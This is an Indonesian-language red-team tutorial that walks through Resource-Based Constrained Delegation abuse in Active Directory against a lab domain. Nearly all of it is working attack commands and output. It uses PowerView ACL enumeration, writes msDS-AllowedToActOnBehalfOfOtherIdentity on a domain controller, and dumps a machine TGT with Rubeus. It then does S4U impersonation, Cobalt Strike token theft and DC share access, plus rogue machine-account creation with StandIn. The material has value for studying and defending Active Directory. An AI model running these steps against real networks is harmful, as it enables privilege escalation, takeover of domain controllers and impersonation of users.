---
title: '[Kerberos] Resource-Based Constrained Delegation (RBCD)'
date: 2023-08-01 23:57:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, kerberos]     # TAG names should always be lowercase
author: nairpaa
---

Mengaktifkan [Unconstrained](/posts/kerberos-unconstrained-delegation/) atau [Constrained Delegation](/posts/kerberos-constrained-delegation/) pada komputer memerlukan penetapan hak pengguna [SeEnableDelegationPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation) pada Domain Controller, yang hanya diberikan kepada Domain dan Enterprise Admin.  

Windows 2012 memperkenalkan jenis delegasi baru yang disebut *Resource-Based Constrained Delegation* (RBCD), yang memungkinkan konfigurasi delegasi ditetapkan pada target daripada sumbernya.

Sebagai perbandingan, *Constrained Delegation* yang dibatasi dikonfigurasikan pada *service* "*front-end*" melalui atribut `msDS-AllowedToDelegateTo`.  

Contoh yang diberikan [sebelumnya](/posts/kerberos-constrained-delegation/) adalah di mana `cifs/dc-2.dev.example.io` berada di atribut `msDS-AllowedToDelegateTo` pada SQL-2. Hal ini memungkinkan akun komputer SQL-2 untuk menyamar sebagai pengguna mana pun ke *service* apa pun di DC-2.

RBCD membalikkan konsep ini dan menempatkan kontrol di tangan *service* "*backend*", melalui atribut baru yang disebut `msDS-AllowedToActOnBehalfOfOtherIdentity`.  

Atribut ini juga tidak memerlukan `SeEnableDelegationPrivilege` untuk dimodifikasi.  Sebagai gantinya, kita hanya membutuhkan hak istimewa seperti `WriteProperty`, `GenericAll`, `GenericWrite` atau `WriteDacl` pada objek komputer.  Hal ini membuatnya lebih mungkin untuk dijadikan sebagai peluang *privilege escalation* atau *lateral movement*.

Dua prasyarat utama untuk mengeksekusi serangan ini adalah:

1. Komputer target yang mana kita dapat memodifikasi `msDS-AllowedToActOnBehalfOfOtherIdentity`.
2. Kontrol terhadap prinsipal lain yang memiliki SPN.

## 0x1 - Exploitation Stages

### Method 1: Have Admin Privileges on Compromised Computer

#### Step 1: Find Computers That Have ACL WriteProperty/GenericWrite/GenericAll/WriteDacl

Kueri ini akan mendapatkan setiap komputer domain dan membaca ACL mereka, memfilter hak yang menarik.  Ini akan menghasilkan beberapa hasil, tetapi yang ditampilkan adalah yang menarik.  Ini menunjukkan bahwa grup **Developer** memiliki hak `WriteProperty` pada semua properti (lihat `ObjectAceType`) untuk DC-2.

```powershell
# Melihat ACL WriteProperty/GenericWrite/GenericAll/WriteDacl pada komputer domain menggunakan Poweview
PS > Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

AceQualifier           : AccessAllowed
ObjectDN               : CN=DC-2,OU=Domain Controllers,DC=dev,DC=example,DC=io
ActiveDirectoryRights  : Self, WriteProperty
ObjectAceType          : All
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 40
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

# Group developer 
PS > ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```

#### Step 2: Get SID From Compromised Computer

Cara yang umum untuk mendapatkan prinsipal dengan SPN adalah dengan menggunakan akun komputer. 

Sebagai contoh, kita memiliki hak istimewa yang lebih tinggi pada Workstation 2, kita dapat menggunakannya. 

```powershell
PS > Get-DomainComputer -Identity wkstn-2 -Properties objectSid

objectsid                                   
---------                                   
S-1-5-21-569305411-121244042-2357301523-1109
```


#### Step 3: Modifies the msDS-AllowedToActOnBehalfOfOtherIdentity Attribute on the Target

Contoh kode PowerShell berikut menunjukkan bagaimana membuat *security descriptor* dalam format SDDL, mengubahnya menjadi format biner, dan menggunakannya untuk memodifikasi atribut `msDS-AllowedToActOnBehalfOfOtherIdentity` pada target.

```powershell
# Sesuaikan SID-nya
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)
```

*Byte deskriptor* ini kemudian dapat digunakan dengan perintah `Set-DomainObject`.  Namun, Jika menggunakan Cobalt Strike, semuanya harus digabungkan menjadi satu perintah PowerShell.

```bash
beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

Setting 'msDS-AllowedToActOnBehalfOfOtherIdentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 67 233 238 33 138 9 58 7 19 145 129 140 85 4 0 0' for object 'DC-2$'
```

```powershell
# Cek properti `msDS-AllowedToActOnBehalfOfOtherIdentity` pada DC-2
PS > Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

#### Step 4: S4U impersonation

Selanjutnya, kita menggunakan akun WKSN-2$ untuk melakukan peniruan S4U dengan Rubeus. 

Perintah `s4u` membutuhkan *hash* TGT, RC4 atau AES. Karena kita sudah memiliki akses admin, kita tinggal mengekstrak TGT dari memori.

```powershell
PS > .\Rubeus.exe triage

[*] Current LUID    : 0x3e7

 ------------------------------------------------------------------------------------------------------------------ 
 | LUID     | UserName                     | Service                                       | EndTime              |
 ------------------------------------------------------------------------------------------------------------------ 
 | 0x3e4    | wkstn-2$ @ DEV.EXAMPLE.IO | krbtgt/DEV.EXAMPLE.IO                      | 9/13/2022 7:27:12 PM |


PS > .\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e4
[*] Current LUID    : 0x3e7

  UserName                 : WKSTN-2$
  Domain                   : DEV
  LogonId                  : 0x3e4
  UserSID                  : S-1-5-20
  AuthenticationPackage    : Negotiate
  LogonType                : Service
  LogonTime                : 9/13/2022 9:26:48 AM
  LogonServer              : 
  LogonServerDNSDomain     : 
  UserPrincipalName        : WKSTN-2$@dev.example.io

    ServiceName              :  krbtgt/DEV.EXAMPLE.IO
    ServiceRealm             :  DEV.EXAMPLE.IO
    UserName                 :  WKSTN-2$
    UserRealm                :  DEV.EXAMPLE.IO
    StartTime                :  9/13/2022 9:27:12 AM
    EndTime                  :  9/13/2022 7:27:12 PM
    RenewTill                :  9/20/2022 9:27:12 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  qEQBH1TdRRjZiZ0iXbeCy4Z3MsOf30l8lLTNE4InemY=
    Base64EncodedTicket   :

doIFuD[...]5JTw==
```

```powershell
# S4U Impesonation
PS > .\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:namina /msdsspn:cifs/dc-2.dev.example.io /ticket:doIFuD[...]5JTw== /nowrap
```

#### Step 5: Extract the Ticket and Leverage It via a New Logon Session

```powershell
PS > .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:namina /password:FakePass /ticket:doIGcD[...]MuaW8=

beacon> steal_token 4092
[+] Impersonated DEV\ababil

beacon> ls \\dc-2.dev.example.io\c$
```

### Method 2: No Admin Privileges on Compromised Computer

Jika kita belum memiliki akses admin lokal pada komputer, kita bisa membuat objek komputer sendiri. 

Secara default, pengguna domain diperbolehkan untuk menambahkan hingga 10 komputer ke dalam domain (diatur pada atribut `ms-DS-MachineAccountQuota`). 

Ini berarti kita bisa mengkonfigurasi komputer dalam jaringan agar menjadi bagian dari domain, tanpa perlu hak administratif.

```powershell
PS > Get-DomainObject -Identity "DC=dev,DC=example,DC=io" -Properties ms-DS-MachineAccountQuota

ms-ds-machineaccountquota
-------------------------
                       10
```

#### Step 1: Create Your Own Computer Object

[StandIn](https://github.com/FuzzySecurity/StandIn) adalah sebuah toolkit post-ex yang ditulis oleh [Ruben Boonen](https://twitter.com/FuzzySec) dan memiliki fungsionalitas untuk membuat sebuah komputer dengan kata sandi acak.

```powershell
PS > .\StandIn.exe --computer EvilComputer --make

[?] Using DC    : dc-2.dev.example.io
    |_ Domain   : dev.example.io
    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=example,DC=io
    |_ Password : oIrpupAtF1YCXaw

[+] Machine account added to AD.
```


#### Step 2: Calculate Password Hash From the Computer

```powershell
PS > .\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.example.io

[*] Action: Calculate Password Hash(es)

[*] Input password             : oIrpupAtF1YCXaw
[*] Input username             : EvilComputer$
[*] Input domain               : dev.example.io
[*] Salt                       : DEV.EXAMPLE.IOhostevilcomputer.dev.example.io
[*]       rc4_hmac             : 73D0774058830F841C9205C857C9EE62
[*]       aes128_cts_hmac_sha1 : FB9A1AB8567D4EF4CEA6186A115D091A
[*]       aes256_cts_hmac_sha1 : 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
[*]       des_cbc_md5          : 49B5514F1F45700D
```

#### Step 3: Get TGT for the Computer

```powershell
PS > .\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
[*] Building AS-REQ (w/ preauth) for: 'dev.example.io\EvilComputer$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF8j[...]MuaW8=

  ServiceName              :  krbtgt/dev.example.io
  ServiceRealm             :  DEV.EXAMPLE.IO
  UserName                 :  EvilComputer$
  UserRealm                :  DEV.example.IO
  StartTime                :  9/13/2022 2:31:34 PM
  EndTime                  :  9/14/2022 12:31:34 AM
  RenewTill                :  9/20/2022 2:31:34 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  /s6yAyTa1670VNAT9yYBGya/mqOU/YJSLu0XuD2ReBE=
  ASREP (key)              :  7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
```

Lalu, lanjutkan lagi ke tahapan [Get SID From Compromised Computer](#step-2-get-sid-from-compromised-computer) dan sesuaikan.

## 0x2 - Restoring the Configuration

Untuk mengembalikan konfigurasi seperti semulai, cukup hapus entri `msDS-AllowedToActOnBehalfOfOtherIdentity` pada target.

```powershell
PS > Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

## 0x3 - References

- https://github.com/FuzzySecurity/StandIn
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
- https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation

